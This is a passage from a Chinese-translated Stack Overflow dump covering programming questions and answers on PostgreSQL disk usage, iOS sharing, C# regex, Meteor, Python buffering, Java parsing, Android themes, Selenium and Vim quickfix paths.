(file_sys text, size text, used text, avail text, used_pct text, mount text) 
SERVER fileserver 
OPTIONS (filename '/pathhere/diskspaceinfo.csv', format 'csv'); 
```

然后像这样查询你的表：

```
select * from diskspaceinfo 
```

如果您只想要特定的东西，当然只需过滤表格以获得您想要的东西。它有局限性，但对我非常有用。

如果你有`plperlu`，你可以使用这个功能： [https ://wiki.postgresql.org/wiki/Free_disk_space](https://wiki.postgresql.org/wiki/Free_disk_space)

一个有用的链接： [https ://wiki.postgresql.org/wiki/Disk_Usage](https://wiki.postgresql.org/wiki/Disk_Usage)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2019-10-03T16:20:21.053

喜欢登山者的回答。我调整了 cron 以返回字节并删除标题行，如下所示。

```
* * * * * df -B1 | tail -n+2 | awk '{print $1","$2","$3","$4","$5","$6}' > /var/www/diskspaceinfo.csv 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2022-02-14T11:15:42.277

执行以下查询以显示服务器中每个数据库的大小。

```
SELECT datname as db_name, pg_size_pretty(pg_database_size(datname)) as db_usage FROM pg_database; 
```

注意：这是基于接受的答案，但不必为每个数据库运行一个查询节省了时间。

# cocoa-touch - UIActivityViewController : Activity-Items 配置

> ID：14346373
> 
> 赞同：2
> 
> 时间：2013-01-15T20:33:24.263
> 
> 标签：cocoa-touch, uiactivityviewcontroller

我有`UIActivityViewController`3 种不同类型的活动项目。

`NSString`,`UISimpleTextPrintFormatter`和`UIImage`.

当我在推特、脸书或作为邮件发送时，系统总是添加字符串和图像，但是当我打印系统时，`UISimpleTextPrintFormatter`除非我从`NSArray`. 我怎样才能告诉`UIActivityViewController`使用`UIImage`打印代替？

```
NSString *textToShare
= [NSString stringWithFormat:@"%@ %@ %i",
   _car.make,_car.model, _car.constructionYear];

UISimpleTextPrintFormatter *textDataToShare
= [[UISimpleTextPrintFormatter alloc] initWithText:textToShare];

UIImage* imageToShare = [UIImage imageNamed:_car.picture];

NSArray* items = @[textToShare,imageToShare,textDataToShare];

UIActivityViewController *activityViewController
= [[UIActivityViewController alloc]
   initWithActivityItems:items applicationActivities:nil]; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-19T11:14:43.563

我认为这将回答您的问题：[UIActivityViewController 中共享提供者的不同数据](https://stackoverflow.com/questions/13551042/different-data-for-sharing-providers-in-uiactivityviewcontroller)

# c# - 如何在 C# 中知道设备是否是带有 RFID 的 MC9090G

> ID：14346379
> 
> 赞同：3
> 
> 时间：2013-01-15T20:33:58.053
> 
> 标签：c#, compact-framework, device

我正在用 C# 为设备 MC9090G 开发，我试图在我的代码中知道设备是否有 RFID 来加载确定的驱动程序；我使用了 coredll.lib 库中的 SPI_GETOEMINFO 但这两个设备返回相同的模型：“MC9090G”，我怎么知道哪一个有 RFID？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-16T21:53:13.697

如果您想阅读制造商硬编码到您设备中的内容，您应该获得[摩托罗拉的开发者工具](http://support.symbol.com/support/browse.do?WidgetName=BROWSE_PRODUCT&TaxoName=SG_SupportGoals&BROWSE_PRODUCT.isProductTaxonomy=true&BROWSE_PRODUCT.NodeId=SG_MC9090CE_1_2&BROWSE_PRODUCT.thisPageUrl=/product/products.do&id=m4&BROWSE_PRODUCT.TaxoName=SG_SupportGoals&NodeType=leaf&NodeName=MC9090%20CE&BROWSE_PRODUCT.NodeType=leaf&NodeId=SG_MC9090CE_1_2&AppContext=AC_ProductPage&param_document=sp)。

如果您想自行设置设备的序列号，可以使用“**关于”框中的“****设备名称**”字段：进入**“设置”**（开始 > 设置），启动“**关于**”小程序，然后切换到“**设备 ID** ”屏幕。

 ******![截屏](../Images/a5f96bcc79890bcb7df6c409dd78736e.png)

从这里，您可以将默认值（`Pocket_PC`在上图中）替换为您设备的序列号……或者您想在其中写入的任何内容。

可以从注册表中读取该字段，如下所示：

```
using Microsoft.Win32.Registry;

private static string _deviceId = null;

public static string DeviceName {
  get {
    if (String.IsNullOrEmpty(_deviceId)) {
      using (RegistryKey key = Registry.LocalMachine.OpenSubKey("Ident", true)) {
        try {
          _deviceId = (string)key.GetValue("Name", "[Unnamed]");
        } catch (Exception e) {
          ErrorWrapper("GetDeviceName", e);
          _deviceId = System.Net.Dns.GetHostName();
        } finally {
          key.Flush();
          key.Close();
        }
      }
    }
    return _deviceId;
  }
} 
```

请注意，这个特定的**getter**只会从注册表中读取一次，然后存储该值以供进一步使用。不过，可能没有必要，因为注册表读取设计得很快。

当然，如果您的员工忘记将移动设备放在充电器上并且它没电了，您将不得不重新输入它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-21T16:36:11.470

在寻找区分设备是否带有 RFID 的解决方案后，我使用 Symbol.RFID.dll 程序集创建了一个 RFID.Reader 实例：

```
Symbol.RFID.Reader info = new Symbol.RFID.Reader(); 
```

因此，当设备没有 RFID 时，此行会抛出 System.Exception 'exception'；所以我正在处理这个异常，以便对没有 RFID 的设备做我想做的事。

我知道这个 try catch 不是最好的解决方案，但它对我有用。

谢谢大家的回答。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-17T14:28:54.977

如果您下载[Motorola EMDK](http://www.motorola.com/Business/US-EN/Business+Product+and+Services/Software+and+Applications/Mobility+Software/Mobile+Application+Utilities/EMDT-EMCT_US-EN)，在 Symbol.ResourceCoordination.dll 程序集的 Symbol.ResourceCoordination 命名空间中有一个名为 TerminalInfo 的类。创建该类的实例，然后读取 ESN 属性以获取设备的实际硬件序列号。

同一类还包含可用于确定已安装硬件的属性，尽管我自己没有使用过这些属性，也无法告诉你应该如何询问它们。******

# c# - 从正则表达式返回组，而不是整行

> ID：14346387
> 
> 赞同：0
> 
> 时间：2013-01-15T20:34:39.937
> 
> 标签：c#, regex

> **可能重复：**
> [正则表达式匹配太多](https://stackoverflow.com/questions/1373966/regex-matching-too-much)

测试字符串：

```
[TA:1010100][FN:AmplifySignal][IP:(Factor|System.Double|"1.5")(Source|System.String|"Sourcetest")(Destination|System.String|"DestTest")] 
```

该字符串的一般格式分为 3 组：

*   group1 => "[TA:" + 1 或 0 重复 + "]"
*   group2 => "[FN:" + AZ 或 az + "]"
*   group3 => "[IP:" + (.*) + "]"

我已经尝试了许多正则表达式的变体，可以让整个测试字符串返回或什么都不返回......我可以弄清楚如何实际分割它并只返回子字符串。

尝试过的模式包括但不限于：

*   `@"^.*$"`
*   `@"^[.*].*$"`
*   `@"^(\[.*\])(.*)$"`
*   `@"^(\[.*\])(\[.*\])(\[.*\])$"`
*   `@"^(\[TA{[10],}\])(\[.*\])(\[.*\])$"` ... ETC。

调用代码：

```
BindingList<Tuple<bool[], IFactory>> Recipe = new BindingList<Tuple<bool[], IFactory>>();

var amp = new Factory.AmplifySignal();
amp.Destination = "DestTest";
amp.Source = "Sourcetest";
amp.Factor = 1.5;
bool[] Ts = new bool[] { true, false, true, false, true, false, false };

var CI = new CompactInstruction(Ts, amp.GetFactoryKey(), amp.GetProperties());

string TestString = CI.ToString();
Console.WriteLine(TestString);

string pattern = @"^(\[.*\])?"; //Have been adjusting in debug mode
while (true)
{
    try
    {
        Match Result = Regex.Match(TestString, pattern, RegexOptions.IgnoreCase);
        if (Result.Success)
        {
            for (int i = 0; i < Result.Groups.Count; i++)
            {
                Console.WriteLine("G{0} - \r\n\t{1}", i, Result.Groups[i]);                            
            }
        }
    }
    catch { }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T20:44:12.523

测试

```
[TA:1010100][FN:AmplifySignal][IP:(Factor|System.Double|"1.5")(Source|System.String|"Sourcetest")(Destination|System.String|"DestTest")] 
```

图案

```
string pattern = @"^(\[.*?\])?(\[.*?\])?(\[.*?\])?$"; 
```

输出：

```
G0 - 
    [TA:1010100][FN:AmplifySignal][IP:(Factor|System.Double|"1.5")(Source|System.String|"Sourcetest")(Destination|System.String|"DestTest")]
G1 - 
    [TA:1010100]
G2 - 
    [FN:AmplifySignal]
G3 - 
    [IP:(Factor|System.Double|"1.5")(Source|System.String|"Sourcetest")(Destination|System.String|"DestTest")] 
```

# c# - 单元测试时如何“取消初始化”WebSecurity？

> ID：14346393
> 
> 赞同：3
> 
> 时间：2013-01-15T20:35:02.853
> 
> 标签：c#, asp.net, unit-testing, asp.net-mvc-4, nunit

## 我的情况

我在 ASP.NET MVC4 应用程序中进行测试。我正在开发的应用程序部分将现代 WebSecurity/SimpleMembershipProvider 与正在逐步淘汰的遗留身份验证系统相结合。~~我很乐意对此进行适当的单元测试，但出于实际原因，我选择不模拟或排除 WebSecurity；我只是将它指向一个测试数据库。~~*

## 问题：

`WebSecurity.InitializeDatabaseConnection()`使用 NUnit，我想使用该方法为一系列测试设置 WebSecurity 。此方法设计为仅运行一次，最好在应用程序启动时运行。

我想隔离我的测试，擦除数据库并`InitializeDatabaseConnection`在每次测试之前调用（即在`[Setup]`方法中）。但是，WebSecurity 静态维护其 Initialized 状态，这意味着如果它在同一个应用程序实例中运行多次，则会引发异常。

换句话说，只有我的第一个测试有效；随后的抛出异常：

```
System.InvalidOperationException : The "WebSecurity.InitializeDatabaseConnection" method can be called only once. 
```

## 问题：

**有什么方法可以“取消初始化”WebSecurity，以便我可以在单个应用程序实例中多次初始化它？或者，有没有办法表明 NUnit 应该在某个夹具中的每次测试之前重新启动应用程序？**

## 笔记：

我试过只在方法或 a中调用`WebSecurity.InitializeDatabaseConnection()`一次，然后在测试之间擦除相关表，但我真的更希望有一个有保证的干净状态。此外，这种方法有一个不幸的副作用：如果我想使用 NUnit GUI 依次运行一些测试，然后再依次运行一些测试，我必须在序列之间重新加载程序集。GUI 在每个测试序列中运行一次这些设置方法，但显然会维护相同的应用程序实例，直到重新加载程序集。`[TestFixtureSetup]``[SetUpFixture]`

* * *

[* 毕竟我决定模拟 WebSecurity；请参阅下面的我的自我回答。]

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-18T20:19:04.767

我说我选择不模拟或存根 WebSecurity，但这是解决此问题的可能方法。我可以使用调用 WebSecurity 方法的实例方法创建一个名为 WebSecurityWrapper 的类，而不是正确调用 WebSecurity 的静态方法。

然后，我的单元测试可以传入一个模拟 WebSecurityWrapper（使用[moq](http://code.google.com/p/moq/)制作），它的行为如我所愿。尝试模拟静态类没有问题（因为 WebSecurityWrapper 是非静态的）。无需为 SimpleMembership 设置数据库。

在遇到与 FormsAuthentication cookie 相关的其他问题并排除任何更好的答案后，我选择使用这种模拟方法继续前进。

# meteor - 为什么 console.log() 不打印任何东西？

> ID：14346394
> 
> 赞同：22
> 
> 时间：2013-01-15T20:35:03.913
> 
> 标签：meteor

刚开始在 Windows 上使用 Meteor。按照初始说明，自动生成的“Hello World”应用程序正在 localhost 上运行。文本和按钮在那里，但单击它不会向控制台输出任何内容。但是，将 console.log() 替换为 alert() 确实会在弹出窗口中显示文本（“您按下按钮”）。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2014-11-27T12:36:49.317

console.log() 输出在浏览器中打印。但如果您正在提交表单或处理事件，则它会立即被清除，因为页面会自动刷新。

如果你想让它工作，1.使用 chrome 浏览器 2.选中控制台上的“保留日志”复选框。然后你可以看到日志

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-01-16T01:11:37.603

@dimfisch - 我没有`console.log`在上面的代码片段中看到 a 。无论如何，我重申我的评论作为答案：

默认情况下，块内的任何`console.log`条目都`Meteor.isServer`不会显示在浏览器的控制台日志中。它们将显示在您通过`meteor`命令启动应用程序的终端中。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2021-05-23T02:46:02.670

对于任何来到这里并正在失去理智的人：对我来说，我已经使用控制台顶部的*过滤器文本框进行了搜索。*如果您忘记清除它，您将不会看到任何与过滤器不匹配的日志:)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2017-03-18T22:05:05.503

确保您正在查看正确的控制台。可能是您的控制台没有记录您正在测试的页面。：） 发生在我身上。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-09-16T03:34:23.527

在控制台上，您写入控制台的任何 console.log() 的左侧，都有一个带有多个选项卡的侧边栏：例如。5 条消息、2 条用户消息、4 条错误、1 条警告、无信息、无详细信息等。

今天早上我发现自己没有选择左侧面板上的“5 个用户消息”项。相反，我不小心选择了“无错误”项。所以我在那里看不到任何 console.log() 。这可能是原因之一。

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2021-09-22T13:49:08.307

在控制台侧边栏中，打开“X 信息”选项卡，其中“X”是消息数或其他内容。

# python - MINGW/MSYS Python 2.7.3 上 stdout 的行缓冲失败

> ID：14346400
> 
> 赞同：4
> 
> 时间：2013-01-15T20:35:16.147
> 
> 标签：python, mingw, stdout, output-buffering, msys

这个简单的脚本说明了这个问题：

```
import time, os, sys
sys.stdout = os.fdopen( sys.stdout.fileno(), 'w', 1 ) # line-buffer stdout
print 'before sleep'
time.sleep( 10 )
print 'after sleep' 
```

如果行缓冲成功，则两行打印之间会有 10 秒的间隙。如果不是，则在 10 秒暂停后（一旦 Python 启动），这两行将几乎同时出现；也就是说，当程序退出时打印这些行。

在 Linux 上，如果包含“sys.stdout”行，我会看到文件和屏幕的行缓冲行为。如果没有该行，我会看到屏幕上的行缓冲行为，但看不到文件。这是意料之中的。

在 MSYS/MINGW 环境中，如果我省略“sys.stdout”行，我会看到与 Linux 相同的行为：行缓冲到屏幕而不是文件。

奇怪的是，*使用*“sys.stdout”行，我看不到屏幕或文件的*行缓冲。*我希望两者都能看到，就像在 Linux 中一样。

任何人都可以提出解决方法吗？

这里有更多信息：

> uname -a MINGW32_NT-6.0 FOO 1.0.11(0.46/3/2) 2009-05-23 19:33 i686 Msys

谢谢，-W。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-16T15:09:14.443

我的一位同事知道答案。

WIN32 不支持行缓冲。如果指定了行缓冲，它将恢复为完全缓冲。无缓冲输出可用，解决方法是在 WIN32 上使用它。我已经在我的简单测试程序中尝试过它，它可以工作。

参考：http: [//msdn.microsoft.com/en-us/library/86cebhfs%28v=vs.71%29.aspx](http://msdn.microsoft.com/en-us/library/86cebhfs%28v=vs.71%29.aspx)

# java - 如何将字符串数字解析为 BigDecimal

> ID：14346403
> 
> 赞同：1
> 
> 时间：2013-01-15T20:35:25.203
> 
> 标签：java, regex, parsing

> **可能重复：**
> [安全字符串到 BigDecimal 的转换](https://stackoverflow.com/questions/3752578/safe-string-to-bigdecimal-conversion)

java中是否有任何最终的解析函数可以分析字符串中给出的数字的类型并在类Number或类似的对象中返回其值。我想将字符串转换为 bigDecimal 或 Number 并将 t 放入集合中，有时我有类似`2.23`or `2,23`or or or `2`or BigInteger like的字符串`233242424242424242`。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-01-15T20:38:10.413

如果您只想将 a 解析`String`为 a `BigDecimal`，则可以使用获取字符串作为参数的[构造函数。](http://docs.oracle.com/javase/7/docs/api/java/math/BigDecimal.html#BigDecimal%28java.lang.String%29)构造函数负责基本的解析。

```
BigDecimal b = new BigDecimal(str); 
```

对于复杂的解析（涉及数千个分隔符），您可以使用设置为的[`DecimalFormat`](http://docs.oracle.com/javase/7/docs/api/java/text/DecimalFormat.html)类中的方法。[`setParseBigDecimal`](http://docs.oracle.com/javase/7/docs/api/java/text/DecimalFormat.html#setParseBigDecimal%28boolean%29)`true`

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2013-01-15T20:45:58.380

Double 方法的文档有一个您正在寻找的正则表达式的优秀示例： [http://docs.oracle.com/javase/6/docs/api/java/lang/Double.html#valueOf(java.lang.字符串](http://docs.oracle.com/javase/6/docs/api/java/lang/Double.html#valueOf(java.lang.String)）

# css - 表格宽度和水平滚动

> ID：14346404
> 
> 赞同：0
> 
> 时间：2013-01-15T20:35:31.030
> 
> 标签：css, twitter-bootstrap

我正在开发一个产品比较网站，所以我有一个[产品比较页面](http://telbat.nl/tablets-vergelijken/24-38-46-49-68-92-108-186-244-295/)。

遗憾的是，列宽不能很好地工作，左侧的“标题”必须为 150 像素，其他所有 200 像素宽度（因此 10x200+150=2150 像素）。但是当我使用 Chrome 开发者工具查找表格时，它的宽度是 1170 像素吗？我正在使用 Twitter Bootstrap，他们有这个（在 bootstrap-responsive.css 中）：

```
.container,
.navbar-static-top .container,
.navbar-fixed-top .container,
.navbar-fixed-bottom .container {
  width: 1170px;
} 
```

我怎样才能推翻这一点？所以宽度将与表格设置的一样：2150px？

我的第二个问题，[我的对手有一个固定的垂直标题](https://tweakers.net/pricewatch/compare/822/300706;304946;309996;314488;316453;317510;320048;320066;321626;322550/)和左右滚动的箭头。我已经搜索了很多，但我只找到了一个水平表头。

我希望有人可以帮助我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-18T14:06:04.573

这是一个老问题，我希望你已经解决了。

对于您的问题，实际上您可以选择制作精良的表格插件，例如表格排序器（[https://github.com/Mottie/tablesorter](https://github.com/Mottie/tablesorter)）。通过设置适当的选项，您应该可以轻松获得所需的内容。

一件好事是这个表格排序器与 BS2.x 配合得很好。但是如果你已经换成BS3，那么它可能看起来有点奇怪，但仍然具有良好的形状和功能。

# android - ActionBarSherlock - 下面的奇怪颜色

> ID：14346409
> 
> 赞同：0
> 
> 时间：2013-01-15T20:35:50.220
> 
> 标签：android, android-actionbar

我一直在使用库 ActionBarSherlock 和 SlidingMenu。它一直运行良好，但我注意到 ActionBar 下方有一种奇怪的颜色。它看起来像这样：

[http://imgur.com/vHspl](http://imgur.com/vHspl)

我的背景颜色是#E7E7E7，我不知道这个#DEDFDE 是从哪里来的。我注意到 SlidingMenu 示例应用程序 ( [https://play.google.com/store/apps/details?id=com.slidingmenu.example](https://play.google.com/store/apps/details?id=com.slidingmenu.example) ) 中的颜色，我真的不喜欢它。我不确定要发布什么代码，所以我设置了 SlidingMenu

```
sm = new SlidingMenu(this);
sm.setMode(SlidingMenu.LEFT);
sm.setBehindOffsetRes(R.dimen.slidingmenu_offset);
sm.setFadeEnabled(false);
sm.setBehindScrollScale(0.0f);
sm.setFadeEnabled(true);
sm.setFadeDegree(0.5f);
sm.setTouchModeAbove(SlidingMenu.TOUCHMODE_FULLSCREEN);
SlidingMenu.attachSlidingMenu(this, sm, true);
sm.setMenu(R.layout.lists_frame); 
```

我的 ActionBar Java 设置

```
ActionBar mActionBar = getSupportActionBar();
mActionBar.setHomeButtonEnabled(true);
mActionBar.setLogo(R.drawable.actionbar_lists);
mActionBar.setTitle("Choose a list"); 
```

还有我的styles.xml

```
 <style name="AppTheme" parent="Theme.Sherlock.Light.DarkActionBar">
    <item name="actionBarStyle">@style/Widget.MyTheme.ActionBar</item>
    <item name="android:actionBarStyle">@style/Widget.MyTheme.ActionBar</item>
</style> 
 <style name="Widget.MyTheme.ActionBar" parent="Widget.Sherlock.ActionBar">
    <item name="android:background">#ff0099ff</item>
    <item name="background">#ff0099ff</item>
</style> 
```

我当然想摆脱它，我尝试搜索但没有答案。希望你们能提供帮助，如果您需要任何其他代码片段，请说出来。

还应该说，如果我使用

```
SlidingMenu.attachSlidingMenu(this, sm, false); 
```

颜色也出现在下面的视图中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T20:55:26.407

似乎是由经常放置在操作栏下方的阴影引起的。阴影在`android:windowContentOverlay`item ( `windowContentOverlay`for `ActionBarSherlock`) 的主题中定义。

`ActionBarSherlock`是否默认为`Theme.Sherlock.Light.DarkActionBar`.

如果想去掉id，在主题中取消即可：

```
<style name="AppTheme" parent="Theme.Sherlock.Light.DarkActionBar">
        <item name="windowContentOverlay">@null</item>
        <item name="android:windowContentOverlay">@null</item>
</style> 
```

# vb.net - 四舍五入到有效数字，VB

> ID：14346410
> 
> 赞同：0
> 
> 时间：2013-01-15T20:35:50.990
> 
> 标签：vb.net, rounding

在 vb 函数“round”中，我希望能够舍入到小数点后一位数。似乎在以下代码中：

> 圆形([SHAPE_Area]/10000, 1) & "ha"

我想四舍五入到小数点后的一个位置，如果小数点后该位置的值为 0，那么它会四舍五入为整数（即​​ 1 而不是 1.0）我希望它四舍五入到 1.0。[SHAPE_Area] 字段的类型为“Double”。我不确定这对 vb 舍入函数及其舍入方式是否有任何意义。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T20:41:10.330

数字四舍五入正确。数字与数字`1`是一回事`1.0`。

您要做的是格式化数字：

```
Dim formatted As String = String.Format("{0:N1} ha", SHAPE_Area) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T20:41:54.123

将 .ToString() 与正确的[格式字符串](http://msdn.microsoft.com/en-us/library/dwhawy9k.aspx)一起使用：

```
([SHAPE_Area]/10000).ToString("F1") & " ha" 
```

# c# - 使用 EnvDTE 收集项目中的用户类列表

> ID：14346412
> 
> 赞同：10
> 
> 时间：2013-01-15T20:35:56.787
> 
> 标签：c#, t4, envdte

我在创建一种方法来列出我的项目中的所有类时遇到问题，该方法`EnvDTE`用于使用 T4 模板接口（基于命名约定），并且那里的文档似乎都没有描述如何做到这一点。我开始：

```
<#@ template debug="true" hostspecific="true" language="C#" #>
<#@ output extension=".cs" #>
<#@ Assembly name="EnvDTE" #>
<#@ Assembly name="System.Core" #>
<#@ import namespace="EnvDTE" #>
<#@ Import Namespace="System.Linq" #>
<#@ Import Namespace="System.Collections.Generic" #>
<#
    var env = (DTE)((IServiceProvider)this.Host)
        .GetService(typeof(EnvDTE.DTE)); 
```

......然后我开始横着走。我能够识别我的项目，但我无法将项目中的类收集到我想过滤到一个平面列表中以创建接口。

我怎样才能做到这一点？我只想要我项目中的课程。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-01-18T15:50:51.680

由于您使用的是 T4，我建议您查看[有形的 T4 编辑器](http://t4-editor.tangible-engineering.com/T4-Editor-Visual-T4-Editing.html "有形的 T4 编辑器")。在他们的画廊中有一个免费的可重用模板“有形的 Visual Studio 自动化助手”。[使用此模板，您可以轻松找到代码类等（请参阅我对这篇文章Design Time Reflection](https://stackoverflow.com/questions/14134016/design-time-reflection/14402269#14402269)的回答）。

如果你想自己做，你应该像这样继续：

```
 var project = env.ActiveDocument.ProjectItem.ContainingProject;
foreach(EnvDTE.CodeElement element in project.CodeModel.CodeElements)
{
    if (element.Kind == EnvDTE.vsCMElement.vsCMElementClass)
    {
        var myClass = (EnvDTE.CodeClass)element;
        // do stuff with that class here
    }
} 
```

我删除了必要的递归。一个 CodeElement 可以包含其他 CodeElement。但这种方式更容易阅读。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T21:18:36.163

我对 T4 模板了解不多，但你能用`Reflection`一个来获得你的班级的吗？

例如：

```
<#@ template debug="true" hostspecific="true" language="C#" #>
<#@ output extension=".cs" #>
<#@ Assembly name="EnvDTE" #>
<#@ Assembly name="System.Core" #>
<#@ import namespace="EnvDTE" #>
<#@ Import Namespace="System.Linq" #>
<#@ Import Namespace="System.Collections.Generic" #>
<#@ Import Namespace="System.Reflection" #>
<#

    var list = Assembly.GetExecutingAssembly().GetTypes().Where(t => t.IsClass); 
```

# d3.js - selection.datum() 有问题

> ID：14346413
> 
> 赞同：0
> 
> 时间：2013-01-15T20:35:57.350
> 
> 标签：d3.js

我正在关注[这个差异图表的例子](http://bl.ocks.org/3894205)。我在我的页面上添加了一些按钮，这些按钮可以进行 ajax 调用以获取新数据集，然后我重新绘制了差异图表。我的页面上有几个不同的图表。

重绘时，上方/下方区域的渲染会损坏：x 值同时渲染上方和下方区域。我相当肯定这不是后端问题，因为初始加载会生成正确的图表；更改参数会弄乱重绘图表；并返回默认参数并重新绘制原始图表也会产生损坏的图表。事实上，我可以部分弄清楚发生了什么：原始时间序列出现在新图表上。就好像绘制了三个系列一样。

我认为这与.datum 有关。我不完全理解它是如何工作的，因为它不同于与 .data 关联的标准输入/更新/退出方法。我已经阅读[了文档](https://github.com/mbostock/d3/wiki/Selections#wiki-datum)，但仍然感到困惑。一些可能性：

1.  原始数据到处都是（即使我用 清理了容器`$('#chart').html('')`）
2.  这`.append(g)`是添加组而不删除较早的组。
3.  这`svg.append("clipPath").attr("id", "clip-below")`导致了问题，因为多个节点具有相同的 id（尽管如此，我不确定这会如何发生，因为我在重绘之前删除了节点）。

我觉得我在这里遗漏了很多基础知识，尽管我花了很多时间试图理解这个库。任何人都可以看到任何明显的东西，或者指出一些好的资源供我查看吗？

更新：这与页面上有两个图表有关。当我打开检查器并关闭它时，我注意到了这一点。底部图表（差异图表）的区域搞砸了，我注意到它用来将上方区域与下方区域分开的新线看起来很像顶部图表中的一条线。

在同一页面上绘制两个图表时，是否有人遇到过依赖问题/命名空间冲突？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-21T02:29:42.833

问题是，剪切路径的 id 是相同的。

我仍然想要更多关于 .datum 的资源。

# javascript - 你如何使用 javascript 进行 html 编码？

> ID：14346414
> 
> 赞同：58
> 
> 时间：2013-01-15T20:35:59.320
> 
> 标签：javascript, html-encode

> **可能重复：**
> [JavaScript/jQuery HTML 编码](https://stackoverflow.com/questions/1219860/javascript-jquery-html-encoding)

我有 html 标签需要编码。

```
<b>test</b> 
```

我需要将其编码为：

```
&lt;b&gt;test&lt;/b&gt; 
```

我正在使用转义，但它不起作用。

```
document.write(escape("<b>test</b>")); 
```

我得到的结果是

```
%3Cb%3Etest%3C/b%3E 
```

这不是我所期望的。还有另一种使用javascript进行html编码的方法吗？

# java - 如何使用 Selenium 2 寻找两个潜在元素？

> ID：14346421
> 
> 赞同：0
> 
> 时间：2013-01-15T20:36:11.487
> 
> 标签：java, selenium-webdriver, testng

超级新手在这里。

我正在测试一个返回推文列表的页面，或者如果没有可用的推文，则返回无结果页面。所以我有两个可能的可接受的结果。我正在尝试在 Selenium 2 中编写一个断言来测试任一元素，但如果两者都不出现，则返回错误。

我正在使用页面对象模型，并编写了以下内容：

```
Assert.assertTrue((iu.twitterUsername().isDisplayed()) || (iu.noData().isDisplayed()), "Page is not loading") 
```

但是，当显示无数据页面时，我的 OR 语句的第一部分中没有找到一个元素。我认为“isDisplayed”的目的是检查元素是否存在。为什么我收到未找到元素的错误？显然它不存在，我想进入我的 OR 语句的第二部分。

当有两个可能的可接受结果时，有没有更好的方法来编写这个？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-16T05:59:10.160

WebElement.isDisplayed() 方法不会告诉您元素是否存在。它告诉您它是否显示在页面上（而不是隐藏）。

您可以使用 WebDriver.findElement() 方法来测试元素是否已加载；如果没有，它将抛出 NoSuchElementException。您的方法可能如下所示：

```
public static boolean isElementLoaded(WebDriver driver, By findBy) {
    try {
        driver.findElement(findBy));
    } catch (NoSuchElementException e) {
        return false;
    } 
    return true;     
} 
```

您可以更改 WebDriver 等待元素加载的时间，如下所示，将其更改为 5 秒：

```
driver.manage().timeouts().implicitlyWait(5, TimeUnit.SECONDS); 
```

或者，您可以创建一个方法来轮询元素，直到达到超时。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-16T22:28:09.823

它应该像这样简单

```
WebDriver driver = new FirefoxDriver();
WebElement element = driver.findElement(By.id(id)); 
```

假设您在寻找我建议使用 WebDriverWait 的元素之前正在做某事，然后如果您在分配的时间内没有找到该元素，则抛出并捕获异常。

```
WebDriverWait wait = new WebDriverWait(driver, 10);
try {
   wait.until(ExpectedConditions.elementToBeSelected(By.id(id)));
} catch (ElementNotFound e) {};
element = driver.findElement(By.id(id)); 
```

# meteor - 如何在流星的发布功能中获取登录用户的电子邮件？

> ID：14346422
> 
> 赞同：3
> 
> 时间：2013-01-15T20:36:13.880
> 
> 标签：meteor

我创建了一个流星 0.5.4 应用程序 - 添加了帐户 UI、帐户密码，并将 {{loginButtons}} 添加到模板 name="hello" 块帽子随每个流星创建一起提供。

当我在 chrome 浏览器控制台中输入这个时， Meteor.user().emails[0].address 根据这些 SO 来源 - [http://goo.gl/MTQWu](http://goo.gl/MTQWu)，[http://goo.gl/Cnbn7](http://goo.gl/Cnbn7) - 我得到当前登录的用户电子邮件。

当我尝试将相同的代码放入 if (Meteor.isClient) 部分时：

```
Template.hello.greeting = function () {
   return Meteor.user().emails[0].address;
}; 
```

我得到：

```
 Uncaught TypeError: Cannot read property '0' of undefined foo.js:3
 Exception from Meteor.flush: TypeError: Cannot call method 'firstNode' of undefined 
```

如果您不能将 Meteor.user() 放在发布功能中，我还能如何获取登录用户的电子邮件？我尝试将其设为共享函数，并在客户端函数中使用 Meteor.call('getEmail', Meteor.userId()) 调用它，结果相似。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-01-15T20:48:59.517

模板是反应式的。这意味着当页面加载时，模板会运行，当其依赖的数据源发生变化时，它会再次运行。在您的情况下，它第一次运行时还`Meteor.user()`没有准备好，所以它还没有`emails`属性，这会导致错误。要解决此问题，您需要检查用户对象是否存在：

```
Template.hello.greeting = function() {
  var user = Meteor.user();
  if (user && user.emails)
    return user.emails[0].address;
} 
```

要在发布函数中获取当前用户，请使用`this.userId`.

# vim - 我可以让 :cn 在 vi m 中使用路径吗？

> ID：14346425
> 
> 赞同：0
> 
> 时间：2013-01-15T20:36:16.443
> 
> 标签：vim

我正在尝试使用 quickfix 来跟踪 Python 错误。通过 makeprg 运行 Python 后，`:copen`窗口包含如下内容：

```
./test_semismooth.py|110| in <module>
./test_semismooth.py|57| in test_semismooth 
/Users/irving/otherlab/other/sim/SemismoothStatic.py|82| in update AttributeError: 'SolverProps' object has no attribute 'solver_props' 
```

`:cn`如果我用/来回跟踪抛出错误`:cp`，则绝对文件名可以正常工作，但`test_semismooth.py`即使它位于 in 也找不到`path`，这看起来像

```
path=,.,~/physbam,~/otherlab/otherfab,~/duck,~/pentago,~/otherlab/other/sim,~/otherlab/other 
```

